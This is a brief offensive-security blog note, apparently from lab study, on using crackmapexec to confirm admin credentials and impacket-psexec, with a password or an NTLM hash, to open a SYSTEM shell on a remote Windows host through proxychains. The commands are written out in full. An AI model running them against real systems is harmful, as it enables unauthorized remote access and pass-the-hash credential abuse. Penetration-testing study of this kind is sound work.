---
layout: post
title: Windows impacket-psexec
titledate: 10/17/23
tags: ["infosec","offsec", "privesc", "psexec", "impacket"]
---

#### admin

if we have verified an admin user say with crackmapexec

    proxychains crackmapexec smb 172....11 -u admin -p 'password123!' -d domain --shares

then we can leverage psexec to drop us into a NT/SYSTEM shell

    proxychains impacket-psexec admin:'password123!'@172....11

or

    └─$ proxychains impacket-psexec admin@10.10.86.152 -hashes :4979d69d4ca66955c075c41cf45f24dc

from here we can leverage our rdp pivot post